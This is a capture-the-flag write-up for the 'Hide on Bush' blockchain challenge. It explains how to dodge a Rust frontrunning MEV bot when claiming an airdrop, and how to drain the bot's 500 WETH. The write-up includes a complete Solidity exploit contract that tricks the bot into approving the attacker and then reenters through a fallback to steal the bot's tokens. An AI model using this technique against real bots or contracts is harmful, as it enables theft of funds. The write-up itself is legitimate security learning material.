# Hide on Bush (13 solves) (274 points)

```
Tony wanted to buy Azuki NFT with ETHs but he only had USDT. He gave Uniswap a try to swap for some ETHs. He had no idea about slippage and set it to 100. Tony later discovered that he recived no ETHs. He cried all day.
```

The files of this challenge has a front running bot written in rust with the artemis framework that will call the FrontrunBot.sol

And I'm thinking, will this bot be profitable in mainnet 🤔?
 
We will know after solving this challenge 

The goal of this challenge is to get > 533.3333333333334 ether of weth :

```solidity
    uint256 constant amount = 500 ether;
    uint256 constant claimableAmount = 100 ether;
...
    function isSolved() external view returns (bool) {
        return weth.balanceOf(address(this)) > amount + claimableAmount / 3;
    }
```

This challenge has 2 parts, hiding from the mev bot to claim the airdrop (100 ether of weth), and draining the mev bot (500 ether of weth)

The 100 ether is in the airdrop contract, which we can claim with the password ("m3f80") in the source code

```solidity
    function claim(string calldata password) external returns (uint256) {
        require(keccak256(abi.encodePacked(password)) == keccak256("m3f80"), "AirdropDistributor: wrong password");
        require(tx.origin != msg.sender, "AirdropDistributor: no EOA");

        (bool s, ) = address(0x0).delegatecall(abi.encodeWithSignature("go(bytes[])", new bytes[](0)));
        require(s, "AirdropDistributor: failed to call");

        weth.transfer(msg.sender, claimableAmount);
        return claimableAmount;
    }
```

We can just call the chalenge contract to claim it :

```solidity
    function claim(string calldata password) external {
        uint256 value = airdropDistributor.claim(password);
        weth.transfer(msg.sender, value);
    }
```

So I just try to call it without any protection to see what happen, and I'm monitoring the mempool with a python script using the pending filter

```
# cast send 0x11Ee628Ae391CF2d441A098a404Bb43F339094E7 "claim(string)" m3f80 -r http://rpc.ctf.so:8545/yzccnvwwblcvcayomljxezgn/main --private-key 0x96e6459f05731ac4958fef1d5d744bfccda5ca28260c0eed51b1122ff0aaf2d8
```

```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

rpcUrl = "http://rpc.ctf.so:8545/yzccnvwwblcvcayomljxezgn/main"
web3 = Web3(HTTPProvider(rpcUrl))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

pending_filter = web3.eth.filter('pending')
while True:
	print(pending_filter.get_new_entries())
```

Obviously, the bot frontrun our transaction, and it does it almost instantly after our transaction is sent, it is really fast

```
# cast tx 0xd2ca7c3852e153f326337372202cad2f50e0d277a5fc4a728f6e668aa5410618 -r http://rpc.ctf.so:8545/yzccnvwwblcvcayomljxezgn/main

blockHash            0x5bd5a5f7af20eab1faae270877ce92fa03ff65fe064bbc87342bc05dfcc42805
blockNumber          12
from                 0x277078092B13222F9AC166Ef837eBc22BdBc8f6e
gas                  99273
gasPrice             100732323995446
hash                 0xd2ca7c3852e153f326337372202cad2f50e0d277a5fc4a728f6e668aa5410618
input                0x73d783890000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006e1bc5290c44433acc0cd39accd7c54100633278000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000064f3fe12c9000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000056d336638300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ed5c4d870b741576db9a543fb54f78a4b52c7808000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000044a9059cbb000000000000000000000000277078092b13222f9ac166ef837ebc22bdbc8f6e0000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000
nonce                1
r                    0xf2b5426fd426960f462614b0b4707097eedfed479faaf772490d0c8f1e393c1e
s                    0x6deb7162b803a3061b8686228b8c6a2fd43f37edddbdee1ffd8ee0ba8198996e
to                   0x7F351C640aaC0BDF6AB074316F3F892f87844844
transactionIndex     0
v                    38
value                0
```

It set gasPrice to 100732.323995446 gwei, and paid 9.999999999999910758 ether as transaction fee for that transaction, we just start with 5 ether, so it's not possible to frontrun the bot's transaction

I'm not familiar with rust, so I spent a lot of time to understand the mev bot's code

```rust
    async fn process_tx(&mut self, tx: Transaction) -> anyhow::Result<Option<SubmitTxToMempool>> {
        let block_number = self.provider.get_block_number().await
            .map_err(|err| anyhow::anyhow!("Failed to get block number: {:?}", err))?;

        let block = self.provider.get_block(BlockId::Number(block_number.into())).await
            .map_err(|err| anyhow::anyhow!("Failed to get block {}: {:?}", block_number, err))?
            .ok_or_else(|| anyhow::anyhow!("Block not found"))?;

        let (top_call_recorder, evm_result) = self.simulate_tx(&tx, &block)?;
        let (balance_changes, _) = self.process_evm_result(&evm_result);
        let sender_profit = balance_changes.get(&utils::eaddress_to_raddress(&tx.from)).unwrap_or(&I256::ZERO);
        tracing::info!("sender profit: {:?}", sender_profit);

        if sender_profit.is_negative() || sender_profit.is_zero() {
            return Ok(None);
        }
        ...
```

In `process_tx()`, it will simulate the transaction and then check the `sender_profit`, and return without frontrunning if its negative or zero

It calculates that in `get_balance_changes_from_logs` that is called by `process_evm_Result()`

```rust
fn get_balance_changes_from_logs(logs: &[revm::primitives::Log], weth_address: &Address) -> HashMap<Address, I256> {
    let mut balance_changes = HashMap::new();

    logs.iter().filter(|log| log.address.eq(weth_address)).for_each(|log| {
        tracing::debug!("log: {:?}", log);

        let (from, to, value) = match log.topics.as_slice() {
            [ERC20_TRANSFER_TOPIC, from, to] => {
                let from = Address::from_slice(&from.0[12..]);
                let to = Address::from_slice(&to.0[12..]);
                let value = revm::primitives::U256::from_be_bytes::<32>(log.data[..32].try_into().unwrap());
                (from, to, value)
            }
            [WETH_WITHDRAWAL_TOPIC, from] => {
                let from = Address::from_slice(&from.0[12..]);
                let value = revm::primitives::U256::from_be_bytes::<32>(log.data[..32].try_into().unwrap());
                (from, Address::default(), value)
            }
            [WETH_DEPOSIT_TOPIC, to] => {
                let to = Address::from_slice(&to.0[12..]);
                let value = revm::primitives::U256::from_be_bytes::<32>(log.data[..32].try_into().unwrap());
                (Address::default(), to, value)
            }
            _ => return,
        };

        let value = I256::from_raw(value);

        tracing::debug!("from: {:?}, to: {:?}, value: {:?}", from, to, value);

        balance_changes.entry(from).and_modify(|v| *v -= value).or_insert(-value);
        balance_changes.entry(to).and_modify(|v| *v += value).or_insert(value);
    });

    balance_changes.retain(|_, v| !v.is_zero());
    balance_changes
}
```

It will basically look for ERC20 transfer, WETH withdrawal/deposit logs

As it only check the transaction sender's profit, if we don't send the claimed tokens back to the transaction sender, the bot should not frontrun our transaction

I confirmed that with this contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Hide {
    Challenge public chal;
    IWETH public weth;
    FrontrunBot public bot;
    AirdropDistributor public airdropDistributor;

    constructor(address _chal) {
        chal = Challenge(_chal);
        weth = chal.weth();
        bot = chal.bot();
        airdropDistributor = chal.airdropDistributor();
    }

    // wont be frontrun
    function hide() public {
        chal.claim("m3f80");
    }

    // will be frontrun
    function unhide() public {
        chal.claim("m3f80");
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
}
```

So, we can just claim it to our contract, then send the tokens back to us in another transaction with a function that can only be called by the owner of our contract

Still, we have to find a way to drain 500 ether of weth from the bot, so I continue read the frontrunning part of the bot's code

```rust
        let mut replacements = HashMap::new();
        replacements.insert(utils::eaddress_to_raddress(&tx.from), self.sender_address);
        replacements.insert(utils::eaddress_to_raddress(&tx.to.unwrap()), self.bot_address);
...
evm.env.tx.data = calls_to_calldata(&top_call_recorder.top_level_calls, &replacements);
```

It will know our calls from the execution traces, and replace the transaction sender to the bot's EOA address, and replace the transaction's `to` address to the bot contract address

Then I try to trick the bot to approve us to spend its weth

```
    ├─ [1936] 0xC33BaD13c1d71147f59839CC43124664b77390Fb::approve(0x11b86017BD412Fd4F2d83478485eaf7C2e0D2202, 0)
    │   ├─ emit Approval(param0: 0x54154AdafC7d0Ee5E286e04Ea04ab9390c95E52E, param1: 0x11b86017BD412Fd4F2d83478485eaf7C2e0D2202, param2: 0)
    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
```

It works, however at the end of the transaction, it set it back to 0

Maybe we can do something like a reentrancy attack before it is set back to 0, by tricking the bot to call our contract, and drain the bot's weth before it set the approval back to 0

It works, we got 500 ether of weth from the bot, but the bot will claim the 100 ether of airdrop successfully and send to the bot's EOA address, and 500 ether of weth is not enough

So I just make a fake airdrop contract with only 1 ether to bait the bot to frontrun our transaction that trick the bot to approve us and call our contract that drain its weth before it set the approval back to 0

### Exploit contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract fakeAirdrop {
    address public owner;
    IWETH public weth;

    constructor(IWETH _weth) payable {
        require(msg.value == 1 ether, "value not 1 ether");
        weth = _weth;
        owner = msg.sender;
        weth.deposit{value: 1 ether}();
    }

    function claim1() public {
        weth.transfer(msg.sender, 1 ether);
    }
}

contract Exploit2 {
    address public owner;
    IWETH public weth;

    constructor(IWETH _weth) {
        weth = _weth;
        owner = msg.sender;
    }

    fallback() external payable {
        if (msg.sender != owner) {
            weth.transferFrom(msg.sender, owner, weth.balanceOf(msg.sender));
        }
    }
}

contract Exploit {
    Challenge public chal;
    IWETH public weth;
    FrontrunBot public bot;
    AirdropDistributor public airdropDistributor;
    address public owner;
    Exploit2 public exploit2;
    fakeAirdrop public fakeairdrop;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _chal) payable {
        require(msg.value == 1 ether, "value not 1 ether");
        chal = Challenge(_chal);
        weth = chal.weth();
        bot = chal.bot();
        airdropDistributor = chal.airdropDistributor();
        owner = msg.sender;
        exploit2 = new Exploit2(weth);
        fakeairdrop = new fakeAirdrop{value: 1 ether}(weth);
    }

    function trick() public {
        weth.approve(address(exploit2),type(uint256).max);
        address(exploit2).call("");
        // chal.claim("m3f80");
        fakeairdrop.claim1();
        weth.transfer(owner, weth.balanceOf(address(this)));
    }

    function hide() public {
        chal.claim("m3f80");
    }

    function drain() public onlyOwner {
        weth.transfer(owner, weth.balanceOf(address(this)));
    }
}
```

First bait the bot to copy our calls in `trick()` to drain the bot's 500 ether of weth, then call `hide()` to claim the airdrop without being frontrun by the bot

### Flag

```
blaz{m3V_p0w3r_1s_4w3s0m3}
```

So back to the question in the beginning, will this bot be profitable in mainnet 🤔?

Probably not, and it will probably be exploited